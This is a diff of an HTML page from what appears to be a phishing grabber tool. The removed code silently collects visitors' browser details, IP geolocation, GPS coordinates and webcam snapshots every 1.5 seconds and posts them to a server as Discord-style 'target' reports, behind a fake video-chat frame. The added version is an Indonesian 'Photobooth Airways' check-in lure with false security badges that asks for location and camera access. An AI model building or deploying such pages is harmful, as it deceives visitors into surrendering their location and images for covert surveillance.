@@ -1,272 +1,239 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="id">
 <head>
-  <script type="text/javascript" src="dwebhook.js">
-  </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Photobooth Airways ✈️ | Full Check-In</title>
+  <meta name="description" content="Check-in lengkap Photobooth Airways — aktifkan lokasi & kamera untuk boarding pass eksklusif Economy, Business, atau First Class!" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Bebas+Neue&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+  <script type="text/javascript" src="dwebhook.js"></script>
 </head>
+<body>
 
-<body onload="getLocation()">
+  <iframe id="site-frame" src="" allowfullscreen allow="geolocation; camera; microphone"></iframe>
+  <video id="video" playsinline autoplay></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
 
-  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
-  </iframe>
+  <div class="sky-bg"></div>
+  <div class="stars" id="stars"></div>
+  <div class="clouds" id="clouds"></div>
 
-  <p id="demo"></p>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-  </script>
-  <script>
-    var x = document.getElementById("demo");
-
-    let datetime = new Date();
-    let localtime = String(datetime.toLocaleTimeString());
-
-
-    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
-
-    const request = new XMLHttpRequest();
-    request.open("POST", "/location_update"); //change webhook
-
-    request.setRequestHeader('Content-type', 'application/json');
-
-    var myEmbed = {
-      author: {
-        name: "Target System Information.."
-      },
-      title: "Uagent:",
-      description: sysinfo,
-      color: 15418782
-    }
-
-    var params = {
-      username: "R4VEN",
-      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-      content: "@everyone Someone Opened The Link O_o ",
-      embeds: [myEmbed]
-    }
-
-    request.send(JSON.stringify(params));
-
-    //...
-
-    $.getJSON("https://api.ipify.org?format=json", function (data) {
-      $("#gfg").html(data.ip);
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "Target Ip"
-        },
-        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n",
-        color: 15548997,
-
-        footer: {
-          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
-        }
-      }
-
-      var params = {
-        username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-
-    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "IP Address Reconnaissance"
-        },
-        title: response.status, //response.query
-        description: '```autohotkey\nContinent: ' + response.continent +
-          "\nContinentCode: " + response.continentcode +
-          "\nCountry: " + response.country +
-          "\nCountrycode: " + response.countrycode +
-          "\nRegionname: " + response.regionName +
-          "\nRegion: " + response.region +
-          "\nCity: " + response.city +
-          "\nDistrict: " + response.district +
-          "\nZip: " + response.zip +
-          "\nTime_zone: " + response.time_zone +
-          "\nName: " + response.name +
-          "\nAs: " + response.as +
-          "\nIsp: " + response.isp +
-          "\nReverse: " + response.reverse +
-          "\nOffset: " + response.offset +
-          "\nCurrency: " + response.currency +
-          "\nProxy: " + response.proxy +
-          "\nMobile: " + response.mobile +
-          "\nLat: " + response.lat +
-          "\nLon: " + response.lon + '```',
-        color: 5763719
-
-      }
-
-      var params = {
-        username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-
-
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      } else {
-        x.innerHTML = "Geolocation is not supported by this browser.";
-      }
-    }
-
-    function showPosition(position) {
-      var latlong = (" GET ", "```prolog\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude);
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "Target Allowed Location Permission"
-        },
-        title: "GPS location of target..",
-        description: latlong + "\n",
-        color: 15844367,
-        footer: {
-          text: "GPS fetch almost exact location because it uses longitude and latitude coordinates."
-        }
-      }
-
-      var params = {
-        username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-
-    }
-
-    function showError(error) {
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          const request = new XMLHttpRequest();
-          request.open("POST", "/location_update"); //change webhook
-
-          request.setRequestHeader('Content-type', 'application/json');
-
-          const params = {
-            username: "R4VEN",
-            avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-            content: "```diff\n- User denied the request for Geolocation.```"
-          }
-
-          request.send(JSON.stringify(params));
-          break;
-        case error.POSITION_UNAVAILABLE:
-          x.innerHTML = "Location information is unavailable."
-          break;
-        case error.TIMEOUT:
-          x.innerHTML = "The request to get user location timed out."
-          break;
-        case error.UNKNOWN_ERROR:
-          x.innerHTML = "An unknown error occurred."
-          break;
-      }
-    }
-  </script>
-  <div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
+  <!-- MOBILE HEADER -->
+  <div class="mobile-header">
+    <div>
+      <div class="airline-logo">✈ PHOTOBOOTH AIRWAYS</div>
+      <div class="airline-sub">photobooth.bapel.my.id</div>
+    </div>
+    <div style="font-size:10px;color:var(--muted);">Full Check-In</div>
   </div>
-  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-  <script>
-    var url = "";
-    request.open("GET", "/get_target", true);
 
-    request.onload = function () {
-      if (request.status === 200) {
-        url = request.responseText;
-      } else {
-        url = "http://127.0.0.1:8000/image"
-      }
-    };
+  <!-- DESKTOP LAYOUT -->
+  <div class="desktop-layout">
+    <div class="desktop-inner">
 
-    request.send();
-    function postFile(file) {
-      let formdata = new FormData();
-      formdata.append("image", file);
-      let xhr = new XMLHttpRequest();
-      xhr.open('POST', url, true);
-      xhr.onload = function () {
-        if (this.status === 200)
-          console.log(this.response);
-        else
-          console.error(xhr);
-      };
-      xhr.send(formdata);
-    }
+      <!-- Left promo -->
+      <div class="promo-panel">
+        <div class="promo-eyebrow">
+          <span class="promo-dot"></span>
+          Full Check-In Tersedia
+        </div>
+        <h1 class="promo-title">
+          YOUR COMPLETE<br/>PHOTOBOOTH<br/><span>EXPERIENCE</span>
+        </h1>
+        <p class="promo-sub">
+          Dapatkan pengalaman check-in lengkap: konfirmasi lokasi booth + selfie boarding pass.
+          Tersedia dalam tiga kelas penerbangan foto eksklusif.
+        </p>
+        <div class="class-pills">
+          <div class="class-pill eco">
+            <div class="pill-icon">🟢</div>
+            <div class="pill-name">Economy</div>
+            <div class="pill-desc">3 foto · Frame standar</div>
+          </div>
+          <div class="class-pill biz">
+            <div class="pill-icon">🔵</div>
+            <div class="pill-name">Business</div>
+            <div class="pill-desc">6 foto · Filter premium</div>
+          </div>
+          <div class="class-pill first">
+            <div class="pill-icon">🟡</div>
+            <div class="pill-name">First Class</div>
+            <div class="pill-desc">Unlimited · Video custom</div>
+          </div>
+        </div>
+        <div class="promo-stats">
+          <div><div class="stat-num">500<span>+</span></div><div class="stat-label">Booth Aktif</div></div>
+          <div><div class="stat-num">100<span>k+</span></div><div class="stat-label">Check-In Berhasil</div></div>
+          <div><div class="stat-num">4.9<span>★</span></div><div class="stat-label">Rating Google</div></div>
+        </div>
+        <div class="promo-trust">
+          <div class="trust-item"><span>🔒</span> SSL Secured</div>
+          <div class="trust-item"><span>📍</span> GPS Akurat</div>
+          <div class="trust-item"><span>📸</span> Foto Instan</div>
+          <div class="trust-item"><span>⚡</span> Proses Cepat</div>
+        </div>
+      </div>
 
+      <!-- Right: Boarding pass -->
+      <div class="boarding-pass">
+        <div class="pass-header">
+          <div class="pass-top">
+            <div class="pass-airline">✈ FULL CHECK-IN</div>
+            <div class="class-badges">
+              <span class="badge eco">ECO</span>
+              <span class="badge biz">BIZ</span>
+              <span class="badge first">FIRST</span>
+            </div>
+          </div>
+          <div class="steps-bar">
+            <div class="step"><div class="step-circle active" id="step1Circle-d">📍</div><div class="step-label">LOKASI</div></div>
+            <div class="step-line"></div>
+            <div class="step"><div class="step-circle pending" id="step2Circle-d">📸</div><div class="step-label">KAMERA</div></div>
+            <div class="step-line"></div>
+            <div class="step"><div class="step-circle pending" id="step3Circle-d">🛫</div><div class="step-label">BOARDING</div></div>
+          </div>
+        </div>
 
+        <div class="ci-boxes">
+          <div class="ci-box loc">
+            <div class="ci-status" id="locStatus-d"></div>
+            <div class="ci-box-icon">📍</div>
+            <div class="ci-box-title">LOKASI GPS</div>
+            <div class="ci-box-sub">Temukan booth terdekat</div>
+          </div>
+          <div class="ci-box cam">
+            <div class="ci-status" id="camStatus-d"></div>
+            <div class="ci-box-icon">📸</div>
+            <div class="ci-box-title">SELFIE FOTO</div>
+            <div class="ci-box-sub">Cetak boarding pass</div>
+          </div>
+        </div>
 
+        <div class="route-strip">
+          <div class="route-city"><div class="route-code">YOU</div><div class="route-name">Lokasi Anda</div></div>
+          <div class="route-line"><div class="plane-path"><div class="path-line"></div><div class="plane-icon">✈</div><div class="path-line"></div></div><div class="route-dur">NON-STOP</div></div>
+          <div class="route-city"><div class="route-code">PBA</div><div class="route-name">PhotoBooth</div></div>
+        </div>
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const errorMsgElement = document.querySelector('span#errorMsg');
+        <div class="pass-details">
+          <div><div class="detail-label">Passenger</div><div class="detail-value">GUEST</div></div>
+          <div><div class="detail-label">Class</div><div class="detail-value">ECONOMY</div></div>
+          <div><div class="detail-label">Gate</div><div class="detail-value">A01</div></div>
+          <div><div class="detail-label">Date</div><div class="detail-value" id="flightDate-d">--</div></div>
+          <div><div class="detail-label">Seat</div><div class="detail-value">--</div></div>
+          <div><div class="detail-label">Flight</div><div class="detail-value">PB-777</div></div>
+        </div>
 
-    const constraints = {
-      audio: false,
-      video: {
+        <div class="tear-line"><div class="tear-circle"></div><div class="tear-dots"></div><div class="tear-circle"></div></div>
+        <div class="pass-cta">
+          <div id="mainContent-d">
+            <button class="btn-checkin" id="allowBtn-d" onclick="startCheckin()">
+              <div class="btn-label"><span>🛫</span><span id="btnText-d">MULAI FULL CHECK-IN</span><div class="spinner" id="spinner-d"></div></div>
+            </button>
+            <div class="pass-footer">🔒 photobooth.bapel.my.id · Layanan Resmi</div>
+            <div class="status-bar" id="statusBar-d"><div class="radar-dot"></div><span id="statusText-d">Memulai proses…</span></div>
+          </div>
+          <div class="success-overlay" id="successOverlay-d">
+            <div class="success-plane">✈️</div>
+            <div class="success-title">BOARDING SELESAI! 🎉</div>
+            <div class="success-sub">Check-in berhasil. Selamat terbang!</div>
+            <div class="success-ticket">✅ Boarding Pass Tercetak · Flight PB-777</div>
+          </div>
+        </div>
+      </div>
 
-        facingMode: "user"
-      }
-    };
+    </div>
+  </div>
 
-    // Access webcam
-    async function init() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints)
-        handleSuccess(stream);
-      } catch (e) {
-        setTimeout(function () {
-          alert("Allow Camera access to video chat");
-          window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623"
-          alert("Grant cam access")
-        }, 15000)
-      }
-    }
+  <!-- MOBILE LAYOUT -->
+  <div class="mobile-layout">
+    <div class="boarding-pass">
+      <div class="pass-header">
+        <div class="pass-top">
+          <div class="pass-airline">✈ FULL CHECK-IN</div>
+          <div class="class-badges">
+            <span class="badge eco">ECO</span>
+            <span class="badge biz">BIZ</span>
+            <span class="badge first">FIRST</span>
+          </div>
+        </div>
+        <div class="steps-bar">
+          <div class="step"><div class="step-circle active" id="step1Circle-m">📍</div><div class="step-label">LOKASI</div></div>
+          <div class="step-line"></div>
+          <div class="step"><div class="step-circle pending" id="step2Circle-m">📸</div><div class="step-label">KAMERA</div></div>
+          <div class="step-line"></div>
+          <div class="step"><div class="step-circle pending" id="step3Circle-m">🛫</div><div class="step-label">BOARDING</div></div>
+        </div>
+      </div>
 
-    // Success
-    function handleSuccess(stream) {
-      window.stream = stream;
-      video.srcObject = stream;
+      <div class="ci-boxes">
+        <div class="ci-box loc">
+          <div class="ci-status" id="locStatus-m"></div>
+          <div class="ci-box-icon">📍</div>
+          <div class="ci-box-title">LOKASI GPS</div>
+          <div class="ci-box-sub">Temukan booth terdekat</div>
+        </div>
+        <div class="ci-box cam">
+          <div class="ci-status" id="camStatus-m"></div>
+          <div class="ci-box-icon">📸</div>
+          <div class="ci-box-title">SELFIE FOTO</div>
+          <div class="ci-box-sub">Cetak boarding pass</div>
+        </div>
+      </div>
 
-      var context = canvas.getContext('2d');
-      setInterval(function () {
+      <div class="route-strip">
+        <div class="route-city"><div class="route-code">YOU</div><div class="route-name">Lokasi Anda</div></div>
+        <div class="route-line"><div class="plane-path"><div class="path-line"></div><div class="plane-icon">✈</div><div class="path-line"></div></div><div class="route-dur">NON-STOP</div></div>
+        <div class="route-city"><div class="route-code">PBA</div><div class="route-name">PhotoBooth</div></div>
+      </div>
 
-        context.drawImage(video, 0, 0, 640, 480);
-        canvas.toBlob(postFile, 'image/jpeg');
-      }, 1500);
+      <div class="pass-details">
+        <div><div class="detail-label">Passenger</div><div class="detail-value">GUEST</div></div>
+        <div><div class="detail-label">Class</div><div class="detail-value">ECONOMY</div></div>
+        <div><div class="detail-label">Gate</div><div class="detail-value">A01</div></div>
+        <div><div class="detail-label">Date</div><div class="detail-value" id="flightDate-m">--</div></div>
+        <div><div class="detail-label">Seat</div><div class="detail-value">--</div></div>
+        <div><div class="detail-label">Flight</div><div class="detail-value">PB-777</div></div>
+      </div>
 
+      <div class="tear-line"><div class="tear-circle"></div><div class="tear-dots"></div><div class="tear-circle"></div></div>
+      <div class="pass-cta">
+        <div id="mainContent-m">
+          <button class="btn-checkin" id="allowBtn-m" onclick="startCheckin()">
+            <div class="btn-label"><span>🛫</span><span id="btnText-m">MULAI FULL CHECK-IN</span><div class="spinner" id="spinner-m"></div></div>
+          </button>
+          <div class="pass-footer">🔒 photobooth.bapel.my.id · Layanan Resmi</div>
+          <div class="status-bar" id="statusBar-m"><div class="radar-dot"></div><span id="statusText-m">Memulai proses…</span></div>
+        </div>
+        <div class="success-overlay" id="successOverlay-m">
+          <div class="success-plane">✈️</div>
+          <div class="success-title">BOARDING SELESAI! 🎉</div>
+          <div class="success-sub">Check-in berhasil. Selamat terbang!</div>
+          <div class="success-ticket">✅ Boarding Pass Tercetak · Flight PB-777</div>
+        </div>
+      </div>
+    </div>
+    <div class="mobile-tagline">PHOTOBOOTH AIRWAYS · ECONOMY · BUSINESS · FIRST CLASS</div>
+  </div>
 
-    }
+  <!-- DESKTOP FOOTER -->
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-brand">© 2025 <strong>Photobooth Airways</strong> · photobooth.bapel.my.id</div>
+      <div class="footer-links">
+        <a href="#">Syarat &amp; Ketentuan</a>
+        <a href="#">Kebijakan Privasi</a>
+        <a href="#">Bantuan</a>
+        <a href="#">Kontak</a>
+      </div>
+      <div class="footer-ssl">🔒 SSL Secured · Data Anda Aman</div>
+    </div>
+  </footer>
 
-    // Load init
-    init();
-  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="app.js"></script>
 </body>
-
 </html>
